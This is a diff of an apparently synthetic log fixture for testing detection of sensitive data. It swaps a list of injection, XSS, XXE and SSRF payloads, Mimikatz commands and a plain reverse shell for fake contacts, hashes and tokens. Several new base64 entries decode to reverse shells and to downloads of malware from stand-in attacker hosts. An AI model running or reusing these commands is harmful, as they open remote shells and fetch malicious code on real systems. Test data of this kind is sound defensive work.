@@ -26,29 +26,98 @@
 2024-01-15 12:05:44 Encoded PowerShell: cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3M=
 2024-01-15 12:10:55 Bitcoin addresses: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa, bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
 2024-01-15 12:15:11 Docker commands: docker exec -it container_id /bin/bash
-2024-01-15 12:20:22 SQL injection attempt: ' OR 1=1--', admin'--', UNION SELECT NULL--
-2024-01-15 12:25:33 XSS payloads: <script>alert('xss')</script>, <img src=x onerror=alert(1)>
-2024-01-15 12:30:44 LDAP injection: *)(&, )(|, *)(uid=*))(|(uid=*
-2024-01-15 12:35:55 Command injection: ; ls -la, | cat /etc/passwd, && whoami
-2024-01-15 12:40:11 Path traversal: ../../../../etc/shadow, ..\\..\\windows\\system.ini
-2024-01-15 12:45:22 XXE payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-2024-01-15 12:50:33 Reverse shell: bash -i >& /dev/tcp/10.0.0.55/4444 0>&1
-2024-01-15 12:55:44 Encoded reverse shell: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNTUvNDQ0NCAwPiYx
-2024-01-15 13:00:55 Mimikatz commands: sekurlsa::logonpasswords, lsadump::sam
-2024-01-15 13:05:11 Registry keys: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
-2024-01-15 13:10:22 Cron expressions: 0 */5 * * * /tmp/backdoor.sh
-2024-01-15 13:15:33 AWS secret: aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-2024-01-15 13:20:44 Private SSH key header: -----BEGIN RSA PRIVATE KEY-----
-2024-01-15 13:25:55 GCP service account: service-account@project-id.iam.gserviceaccount.com
-2024-01-15 13:30:11 Azure connection string: DefaultEndpointsProtocol=https;AccountName=storage
-2024-01-15 13:35:22 Slack webhook: https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXX
-2024-01-15 13:40:33 GitHub token: ghp_1234567890abcdefghijklmnopqrstuvwxyz
-2024-01-15 13:45:44 Encoded exfiltration: ZGF0YT1zZW5zaXRpdmVfaW5mb3JtYXRpb24mZGVzdD0xMC4wLjAuNTU=
-2024-01-15 13:50:55 Suspicious user agents: sqlmap/1.4.7, nikto/2.1.6, nmap scripting engine
-2024-01-15 13:55:11 Polyglot payload: jaVasCript:/*--></title></style></textarea></script></xmp>
-2024-01-15 14:00:22 IDOR attempt: /api/user/1, /api/user/2, /api/user/3 (sequential scanning)
-2024-01-15 14:05:33 GraphQL introspection: {__schema{types{name,fields{name}}}}
-2024-01-15 14:10:44 SSRF attempt: http://169.254.169.254/latest/meta-data/iam/security-credentials/
-2024-01-15 14:15:55 NoSQL injection: {"$gt":""}, {"$ne":null}, {"$where":"1==1"}
-2024-01-15 14:20:11 Template injection: {{7*7}}, ${7*7}, <%= 7*7 %>, ${{7*7}}
-2024-01-15 14:25:22 Deserialization payload: rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
+2024-01-15 12:20:22 Encoded exfil data: ZGF0YWJhc2VfY3JlZGVudGlhbHNfaGVyZQ==
+2024-01-15 12:25:33 Contact emails: admin@securecompany.com, security@infosec.net, helpdesk@techcorp.io
+2024-01-15 12:30:44 Phone contacts: 1-800-555-1234, (202) 555-9876, +44-20-7123-4567
+2024-01-15 12:35:55 IPv6 traffic: fe80::a00:27ff:fe8e:8a5c, 2001:db8:85a3::8a2e:370:7334
+2024-01-15 12:40:11 JWT authentication: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzNDU2In0.signature
+2024-01-15 12:45:22 MD5 checksums: d41d8cd98f00b204e9800998ecf8427e, 5f4dcc3b5aa765d61d8327deb882cf99
+2024-01-15 12:50:33 SHA256 integrity: 2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae
+2024-01-15 12:55:44 Hardware addresses: 00:50:56:C0:00:08, A4-5E-60-E4-F2-3B
+2024-01-15 13:00:55 Encoded shell: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNTUvNDQ0NCAwPiYx
+2024-01-15 13:05:11 Support emails: contact@example.org, support@cloudservice.com, noreply@system.net
+2024-01-15 13:10:22 International phones: +1-415-555-0100, (212) 555-0199, 011-81-3-1234-5678
+2024-01-15 13:15:33 IPv6 endpoints: 2001:4860:4860::8888, fe80::1ff:fe23:4567:890a
+2024-01-15 13:20:44 JWT session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uIjoiYWJjMTIzIn0.token
+2024-01-15 13:25:55 File hashes MD5: c4ca4238a0b923820dcc509a6f75849b, 6f8f57715090da2632453988d9a1501b
+2024-01-15 13:30:11 File hashes SHA256: 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
+2024-01-15 13:35:22 Network MACs: 52:54:00:12:34:56, D8-9E-F3-A2-B1-C0
+2024-01-15 13:40:33 Encoded API key: c2tfbGl2ZV8xMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcA==
+2024-01-15 13:45:44 User emails: developer@startup.io, manager@enterprise.com, analyst@datacompany.net
+2024-01-15 13:50:55 Contact numbers: 555-0101, (310) 555-0142, +61-2-5550-0183
+2024-01-15 13:55:11 IPv6 addresses: 2001:0db8:0000:0000:0000:ff00:0042:8329, fe80::200:5aee:feaa:20a2
+2024-01-15 14:00:22 JWT bearer: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ODc2NTQzMjEifQ.sig
+2024-01-15 14:05:33 Checksum MD5: e10adc3949ba59abbe56e057f20f883e, 25d55ad283aa400af464c76d713c07ad
+2024-01-15 14:10:44 Integrity SHA256: ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d
+2024-01-15 14:15:55 Device MACs: 00:0C:29:68:5C:4D, 8C-16-45-9A-B2-3E
+2024-01-15 14:20:11 Encoded reverse shell: bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xIDQ0NDQ=
+2024-01-15 14:25:22 Business emails: sales@corporation.com, info@business.org, team@startup.co
+2024-01-15 14:30:33 Telephone numbers: +33-1-42-86-82-00, 020-7946-0958, (408) 555-0176
+2024-01-15 14:35:44 IPv6 full format: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
+2024-01-15 14:40:55 IPv6 compressed: ::1, fe80::, 2001:db8::1
+2024-01-15 14:45:11 JWT access token: eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJ1c2VyMTIzIn0.xyz
+2024-01-15 14:50:22 Password MD5: 5f4dcc3b5aa765d61d8327deb882cf99, fcea920f7412b5da7be0cf42b8c93759
+2024-01-15 14:55:33 Document SHA256: 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+2024-01-15 15:00:44 Interface MACs: 00:15:5D:01:02:03, BC-AE-C5-12-34-56
+2024-01-15 15:05:55 Encoded credentials: dXNlcm5hbWU6cGFzc3dvcmQxMjNAISE=
+2024-01-15 15:10:11 System emails: root@localhost, admin@internal.local, postmaster@mail.local
+2024-01-15 15:15:22 Phone directory: 1-888-555-0123, (650) 555-0145, +86-10-5555-0198
+2024-01-15 15:20:33 IPv6 loopback: ::1, IPv6 link-local: fe80::1234:5678:9abc:def0
+2024-01-15 15:25:44 JWT refresh: eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCJ9.sig
+2024-01-15 15:30:55 Cache key MD5: 098f6bcd4621d373cade4e832627b4f6, 827ccb0eea8a706c4c34a16891f84e7b
+2024-01-15 15:35:11 Artifact SHA256: 3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea
+2024-01-15 15:40:22 Server MACs: 00:1A:A0:12:34:56, F4-B5-20-45-67-89
+2024-01-15 15:45:33 Encoded token: ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5
+2024-01-15 15:50:44 Customer emails: customer@retailer.com, client@services.net, buyer@ecommerce.io
+2024-01-15 15:55:55 Global phones: +49-30-1234-5678, (044) 555-0112, 1-800-CALLNOW
+2024-01-15 16:00:11 IPv6 multicast: ff02::1, ff02::2, 2001:db8:1234::5678:abcd
+2024-01-15 16:05:22 JWT ID token: eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhdXRoLnNlcnZlciJ9.token
+2024-01-15 16:10:33 Session MD5: 21232f297a57a5a743894a0e4a801fc3, 1a1dc91c907325c69271ddf0c944bc72
+2024-01-15 16:15:44 Binary SHA256: d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2
+2024-01-15 16:20:55 Wireless MACs: 00:25:96:12:34:56, 70-77-81-A5-B3-C1
+2024-01-15 16:25:11 Encoded payload: c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwMC80NDQ0IDA+JjE=
+2024-01-15 16:30:22 Employee emails: employee@company.com, staff@organization.org, worker@factory.net
+2024-01-15 16:35:33 Office phones: (202) 555-0147, +39-06-1234-5678, 555.321.0987
+2024-01-15 16:40:44 IPv6 site-local: fec0::1234, global: 2001:0db8:0a0b:12f0:0000:0000:0000:0001
+2024-01-15 16:45:55 JWT auth header: eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhcGkuc2VydmVyIn0.xyz
+2024-01-15 16:50:11 API response MD5: 8277e0910d750195b448797616e091ad, 9e107d9d372bb6826bd81d3542a419d6
+2024-01-15 16:55:22 Config SHA256: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
+2024-01-15 17:00:33 Virtual MACs: 00:50:56:C0:00:01, 52-54-00-A1-B2-C3
+2024-01-15 17:05:44 Encoded script: IyEvYmluL2Jhc2gKZWNobyAiSGVsbG8gV29ybGQi
+2024-01-15 17:10:55 Partner emails: partner@alliance.com, vendor@supplier.net, affiliate@network.org
+2024-01-15 17:15:11 Support lines: 1-877-555-0199, (415) 555-0123, +91-11-5555-0145
+2024-01-15 17:20:22 IPv6 addresses: 2001:db8:0:0:1:0:0:1, fe80::a00:27ff:feaa:bbcc
+2024-01-15 17:25:33 JWT service token: eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzZXJ2aWNlIjoidXNlci1hcGkifQ.sig
+2024-01-15 17:30:44 Resource MD5: cc03e747a6afbbcbf8be7668acfebee5, 5d8aa76f2699e2e27e0f2db3c9fcebea
+2024-01-15 17:35:55 Package SHA256: 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090
+2024-01-15 17:40:11 Container MACs: 02:42:AC:11:00:02, 0A-00-27-00-00-15
+2024-01-15 17:45:22 Encoded command: Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL21hbHdhcmUuc2g=
+2024-01-15 17:50:33 System accounts: system@internal.net, daemon@service.local, nobody@localhost
+2024-01-15 17:55:44 Emergency numbers: 911, 999, (800) 555-HELP, +1-900-555-0100
+2024-01-15 18:00:55 IPv6 unique local: fd00::1234:5678:90ab:cdef, fc00::1
+2024-01-15 18:05:11 JWT machine token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJtYWNoaW5lX2lkIjoibTEyMyJ9.
+2024-01-15 18:10:22 Token MD5: 0cc175b9c0f1b6a831c399e269772661, 92eb5ffee6ae2fec3ad71c777531578f
+2024-01-15 18:15:33 Release SHA256: bb0a6e5394eaeaed887267a1fde3ab03f5504fd1e5a2b5e95c1c63c3f3e8a9e9
+2024-01-15 18:20:44 Bridge MACs: 00:00:5E:00:53:01, 01-80-C2-00-00-00
+2024-01-15 18:25:55 Encoded exfiltration: ZXhmaWx0cmF0ZWRfZGF0YV9oZXJlX3NlbnNpdGl2ZQ==
+2024-01-15 18:30:11 Department emails: hr@company.com, finance@business.org, it@tech.net
+2024-01-15 18:35:22 Branch phones: (617) 555-0134, +7-495-555-0167, 1-866-555-0198
+2024-01-15 18:40:33 IPv6 documentation: 2001:db8:85a3:8d3:1319:8a2e:370:7348
+2024-01-15 18:45:44 JWT client token: eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMyJ9.eyJjbGllbnRfaWQiOiJjMTIzIn0.sig
+2024-01-15 18:50:55 Signature MD5: 7815696ecbf1c96e6894b779456d330e, 4a7d1ed414474e4033ac29ccb8653d9b
+2024-01-15 18:55:11 Validation SHA256: 5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5
+2024-01-15 19:00:22 Router MACs: 00:1E:C9:F1:23:45, A0-63-91-12-34-AB
+2024-01-15 19:05:33 Encoded backdoor: L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjEwLzQ0NDQgMD4mMQ==
+2024-01-15 19:10:44 Marketing emails: marketing@brand.com, promo@deals.net, newsletter@updates.io
+2024-01-15 19:15:55 Hotline phones: 1-800-SUPPORT, (555) 123-4567, +52-55-1234-5678
+2024-01-15 19:20:11 IPv6 teredo: 2001:0:4137:9e76:1035:2d5b:3f57:fe9a
+2024-01-15 19:25:22 IPv6 6to4: 2002:c000:0201::1
+2024-01-15 19:30:33 JWT API token: eyJhbGciOiJSUzI1NiIsInR5cCI6ImF0K2p3dCJ9.eyJzY29wZSI6ImFwaS5yZWFkIn0.token
+2024-01-15 19:35:44 Secret MD5: 2ae96b1be3f890c3a233f35d0fabe2c1, b59c67bf196a4758191e42f76670ceba
+2024-01-15 19:40:55 Credential SHA256: 127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935
+2024-01-15 19:45:11 Switch MACs: 00:23:04:EE:BE:23, 44-D8-84-90-A1-B2
+2024-01-15 19:50:22 Network interfaces: eth0: 02:00:4C:4F:4F:50, wlan0: 00-11-22-33-44-55
+2024-01-15 19:55:33 Encoded attack: d2dldCBodHRwOi8vbWFsaWNpb3VzLmNvbS9iYWNrZG9vci5zaCA7IGNoIG1vZCA
+2024-01-15 20:00:44 Tech support: support@tech.com, helpdesk@it.org, tickets@service.net
+2024-01-15 20:05:55 Contact centers: 1-888-CALL-NOW, +1-555-0199, (888) 555-TECH
+2024-01-15 20:10:11 IPv6 anycast: 2001:db8:1::1, 2001:4860:4860::8844
